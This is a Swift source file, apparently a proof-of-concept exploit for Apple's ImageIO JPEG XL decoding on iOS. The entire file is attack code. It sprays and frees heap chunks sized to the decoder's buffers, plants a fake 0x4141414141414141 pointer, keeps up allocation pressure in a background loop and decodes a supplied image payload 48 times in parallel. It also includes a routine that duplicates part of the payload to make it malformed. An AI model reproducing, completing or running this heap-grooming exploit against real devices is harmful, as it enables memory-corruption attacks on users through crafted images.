//
//  jpwnxl.swift
//  poc
//
//  Created by ruter on 18.05.26.
//

import UIKit
import ImageIO
import Foundation

private let jxldecodersize = 3584
private let vectbuffersize = 6144
private let groomcount = 128
private let paralleldecodes = 48

@_silgen_name("CFRelease")
private func rawCFRelease(_ value: CFTypeRef)

@_silgen_name("CGImageRelease")
private func rawCGImageRelease(_ image: CGImage)

func simplejxl(_ hex: String) -> UIImage? {
    let bytes = stride(from: 0, to: hex.count, by: 2).compactMap {
        UInt8(hex.dropFirst($0).prefix(2), radix: 16)
    }

    let data = Data(bytes)

    guard
        let src = CGImageSourceCreateWithData(data as CFData, nil),
        let cg = CGImageSourceCreateImageAtIndex(src, 0, nil)
    else { return nil }

    return UIImage(cgImage: cg)
}

func selfgroominghex(_ hex: String, repeatCount: Int = 2) -> String {
    let bytes = stride(from: 0, to: hex.count, by: 2).compactMap {
        UInt8(hex.dropFirst($0).prefix(2), radix: 16)
    }
    let data = Data(bytes)

    guard data.count > 0x64 else {
        return hex
    }

    let prefix = data.prefix(0x64)
    let fakeTail = data.dropFirst(0x64)
    var mutated = Data(prefix)

    for _ in 0..<repeatCount {
        mutated.append(fakeTail)
    }

    return mutated.map { String(format: "%02x", $0) }.joined()
}

func fileonlyjxl(_ hex: String) {
    let bytes = stride(from: 0, to: hex.count, by: 2).compactMap {
        UInt8(hex.dropFirst($0).prefix(2), radix: 16)
    }
    let data = Data(bytes)

    autoreleasepool {
        guard let source = CGImageSourceCreateWithData(data as CFData, nil) else {
            return
        }

        if let image = CGImageSourceCreateImageAtIndex(source, 0, nil) {
            let width = image.width
            let height = image.height

            if width > 0, height > 0, width <= 8192, height <= 8192 {
                let colorSpace = CGColorSpaceCreateDeviceRGB()
                let context = CGContext(
                    data: nil,
                    width: width,
                    height: height,
                    bitsPerComponent: 8,
                    bytesPerRow: 4 * width,
                    space: colorSpace,
                    bitmapInfo: CGImageAlphaInfo.premultipliedLast.rawValue
                )

                if let context {
                    context.draw(image, in: CGRect(x: 0, y: 0, width: width, height: height))
                }
            }

            rawCGImageRelease(image)
        }

        rawCFRelease(source)
    }
}

func decodejxl(_ data: Data) {
    autoreleasepool {
        guard let source = CGImageSourceCreateWithData(data as CFData, nil) else {
            return
        }

        if let image = CGImageSourceCreateImageAtIndex(source, 0, nil) {
            let width = image.width
            let height = image.height

            if width > 0, height > 0, width <= 8192, height <= 8192 {
                let colorSpace = CGColorSpaceCreateDeviceRGB()
                let context = CGContext(
                    data: nil,
                    width: width,
                    height: height,
                    bitsPerComponent: 8,
                    bytesPerRow: 4 * width,
                    space: colorSpace,
                    bitmapInfo: CGImageAlphaInfo.premultipliedLast.rawValue
                )

                if let context {
                    context.draw(image, in: CGRect(x: 0, y: 0, width: width, height: height))
                }
            }

            rawCGImageRelease(image)
        }

        rawCFRelease(source)
    }
}

func jpwnxl(_ hex: String, completion: @escaping @Sendable (Bool) -> Void) {
    let bytes = stride(from: 0, to: hex.count, by: 2).compactMap {
        UInt8(hex.dropFirst($0).prefix(2), radix: 16)
    }
    let jxldata = Data(bytes)

    guard !jxldata.isEmpty else {
        completion(false)
        return
    }

    let groom4k = UnsafeMutablePointer<UnsafeMutableRawPointer?>.allocate(capacity: groomcount)
    let groom6k = UnsafeMutablePointer<UnsafeMutableRawPointer?>.allocate(capacity: groomcount)
    groom4k.initialize(repeating: nil, count: groomcount)
    groom6k.initialize(repeating: nil, count: groomcount)

    for index in 0..<groomcount {
        let slot4k = malloc(jxldecodersize)
        groom4k[index] = slot4k
        if let slot4k {
            memset(slot4k, 0x41, jxldecodersize)
            let badPtr = UInt64(0x4141414141414141)
            (slot4k + 0x10).storeBytes(of: badPtr, as: UInt64.self)
        }

        let slot6k = malloc(vectbuffersize)
        groom6k[index] = slot6k
        if let slot6k {
            memset(slot6k, 0x41, vectbuffersize)
        }
    }

    for index in stride(from: 0, to: groomcount, by: 2) {
        if let slot4k = groom4k[index] {
            free(slot4k)
            groom4k[index] = nil
        }

        if let slot6k = groom6k[index] {
            free(slot6k)
            groom6k[index] = nil
        }
    }

    let pressurequeue = DispatchQueue(label: "com.poc.jxl.pressure")
    let decodequeue = DispatchQueue(label: "com.poc.jxl.decode", attributes: .concurrent)
    let group = DispatchGroup()
    let stoplock = NSLock()
    var stoppressure = false

    pressurequeue.async {
        while true {
            stoplock.lock()
            let shouldStop = stoppressure
            stoplock.unlock()

            if shouldStop {
                break
            }

            let a = malloc(jxldecodersize)
            let b = malloc(vectbuffersize)

            if let a {
                memset(a, 0x41, jxldecodersize)
                free(a)
            }

            if let b {
                memset(b, 0x41, vectbuffersize)
                free(b)
            }
        }
    }

    for _ in 0..<paralleldecodes {
        group.enter()
        decodequeue.async {
            decodejxl(jxldata)
            group.leave()
        }
    }

    group.notify(queue: .main) {
        stoplock.lock()
        stoppressure = true
        stoplock.unlock()

        for index in 0..<groomcount {
            if let slot4k = groom4k[index] {
                free(slot4k)
            }

            if let slot6k = groom6k[index] {
                free(slot6k)
            }
        }

        groom4k.deinitialize(count: groomcount)
        groom6k.deinitialize(count: groomcount)
        groom4k.deallocate()
        groom6k.deallocate()

        completion(true)
    }
}
